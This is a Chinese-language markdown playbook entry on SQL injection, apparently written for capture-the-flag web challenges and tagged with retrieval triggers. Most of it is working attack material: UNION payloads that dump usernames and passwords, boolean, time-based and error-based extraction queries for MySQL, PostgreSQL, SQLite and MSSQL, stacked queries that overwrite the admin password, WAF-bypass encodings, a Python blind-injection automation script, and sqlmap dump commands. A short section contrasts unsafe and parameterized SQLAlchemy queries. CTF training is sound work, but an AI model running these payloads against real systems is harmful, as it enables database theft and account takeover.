---
category: web
tags: [sqli, sql_injection, union, blind, error_based, time_based, mysql, postgresql, sqlite, mssql, 注入, sql注入]
triggers: [sql injection, sqli, union select, blind sql, error based, time based, login bypass, database, 注入, sql注入, order by, information_schema, sqlmap]
related: [ssti, deserialization_pickle, xxe, nosql_injection]
---

# SQL 注入

## 什么时候用

用户输入被拼接进 SQL 查询，没有用参数化查询或白名单过滤。几乎所有 web 题都应该先测试 SQLi。

## 前提条件

- 存在用户可控的 SQL 查询参数（GET/POST/Cookie/Header 都可能）
- 后端拼接 SQL 而非使用参数化查询
- 需要知道或猜测后端数据库类型（MySQL/PostgreSQL/SQLite/MSSQL）

## 判断注入类型

```
' → 报错    → 可能有注入
' or 1=1-- → 返回更多数据 → 可能有注入
' and 1=2-- → 返回变少   → 确认布尔型
' and sleep(3)-- → 延迟   → 确认时间型
```

## 攻击步骤

### 1. UNION 注入（最直接）

**适用**：查询结果直接显示在页面上。

**步骤**：

```sql
-- 1) 确定列数
' ORDER BY 1-- ✓
' ORDER BY 2-- ✓
' ORDER BY 3-- ✗  → 2列

-- 2) 确定回显位
' UNION SELECT 1,2--
-- 页面显示 "2" → 第2列可回显

-- 3) 提取数据
' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password) FROM users--
```

**SQLite 版本**（没有 information_schema）：
```sql
' UNION SELECT 1,group_concat(name) FROM sqlite_master WHERE type='table'--
' UNION SELECT 1,sql FROM sqlite_master WHERE name='users'--
```

### 2. 布尔盲注

**适用**：页面只返回"有结果"和"无结果"两种状态。

```sql
-- 逐字符猜解
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>97--
```

**自动化**（二分搜索，每字符 ~7 次请求）：
```python
import requests

def blind_sqli(url, query):
    result = ""
    for pos in range(1, 50):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}--"
            r = requests.get(url, params={"id": payload})
            if "正常响应标识" in r.text:
                low = mid + 1
            else:
                high = mid
        if low == 32:
            break
        result += chr(low)
    return result

password = blind_sqli(url, "SELECT password FROM users WHERE username='admin'")
```

### 3. 时间盲注

**适用**：页面完全无差异（连状态码都一样）。

```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users),1,1))>97, SLEEP(2), 0)--

-- PostgreSQL
' AND CASE WHEN ASCII(SUBSTRING((SELECT password FROM users),1,1))>97 THEN pg_sleep(2) ELSE pg_sleep(0) END--

-- SQLite（没有 sleep，用 heavy query 替代）
' AND CASE WHEN ... THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 0 END--
```

### 4. 报错注入

**适用**：页面显示 SQL 错误信息。

```sql
-- MySQL
' AND extractvalue(1, concat(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND updatexml(1, concat(0x7e,(SELECT password FROM users LIMIT 1)), 1)--

-- PostgreSQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

-- MSSQL
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
```

### 5. 堆叠注入

**适用**：后端允许多条 SQL（如 PHP + MySQL 的 `mysqli_multi_query`）。

```sql
'; INSERT INTO users VALUES('hacker','admin_password');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
```

## WAF 绕过技巧

```sql
-- 大小写混合
uNiOn SeLeCt

-- 注释分割关键词
UN/**/ION SE/**/LECT

-- 双写绕过
UNUNIONION SESELECTLECT

-- 编码
%55%4e%49%4f%4e  (URL编码)

-- 等价替换
&&  →  AND
||  →  OR
```

## ORM 注入（容易忽略）

即使用了 ORM 也可能有 SQLi：
- `sqlalchemy.text()` 直接传入用户输入
- ORM 的 `order_by` 参数接受原始字符串
- 聚合函数（min/max）跳过字段验证
- f-string 拼接 SQL 片段

```python
# 危险！
query = sqlalchemy.text(f"SELECT * FROM users WHERE name = '{user_input}'")

# 安全
query = sqlalchemy.text("SELECT * FROM users WHERE name = :name").bindparams(name=user_input)
```

## 常见坑

- **列数不匹配**：UNION 要求前后 SELECT 列数相同，用 ORDER BY 先确定列数
- **类型不匹配**：某些数据库要求 UNION 的列类型一致，用 NULL 代替
- **单引号被转义**：试双引号 `"`、反引号 `` ` ``、或数字型注入（不需要引号）
- **注释符差异**：MySQL 用 `--+` 或 `#`，PostgreSQL/MSSQL 用 `--`，SQLite 用 `--`
- **group_concat 长度限制**：MySQL 默认 1024 字符，用 `SET SESSION group_concat_max_len=100000`

## sqlmap 快速使用

```bash
# 基本检测
sqlmap -u "http://target/page?id=1" --batch

# 指定参数
sqlmap -u "http://target/page" --data "username=admin&password=test" -p username

# 获取数据
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# POST + Cookie
sqlmap -u "http://target/page" --data "id=1" --cookie "session=abc"

# 绕过 WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between
```

## 相关技术

- [[ssti]] — 如果不是 SQL 拼接而是模板拼接
- [[xxe]] — 某些数据库支持 XML 函数，可结合利用
